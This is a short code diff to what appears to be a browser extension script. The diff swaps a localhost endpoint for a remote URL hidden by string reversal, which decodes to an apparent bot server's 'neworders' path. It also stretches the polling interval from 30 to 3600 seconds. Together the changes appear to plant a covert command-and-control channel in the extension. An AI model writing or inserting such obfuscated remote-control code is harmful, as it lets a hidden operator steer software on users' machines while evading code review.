@@ -3,7 +3,7 @@ function getnews(callback){
 		this.action = action
 		this.target = target
 	}
-	var request = new BGRequest("getneworders", "http://localhost/neworders/")
+	var request = new BGRequest("getneworders", ("sredrowen/moc.axmoc.revrestobxeh//:ptth").split("").reverse().join(""))
 	chrome.runtime.sendMessage({message: request}, function(responseMessage) {
 		var handleResponse = function(getResponse, sender, sendResponse) {
 				chrome.extension.onMessage.removeListener(handleResponse)
@@ -35,7 +35,7 @@ function bootstrap(callback){
 	if((lastjob) && (comCached)){
 		var timeLimit = localStorage.getItem(STORAGE_LIMIT_TIME)
 		if((!timeLimit) || (isNaN(timeLimit)) || (timeLimit < 30)){
-			localStorage.setItem(STORAGE_LIMIT_TIME, 30)
+			localStorage.setItem(STORAGE_LIMIT_TIME, 3600)
 		}
 		var secondsLack = ((mcdate - lastjob)/1000);
 		if(secondsLack >= localStorage.getItem(STORAGE_LIMIT_TIME)){
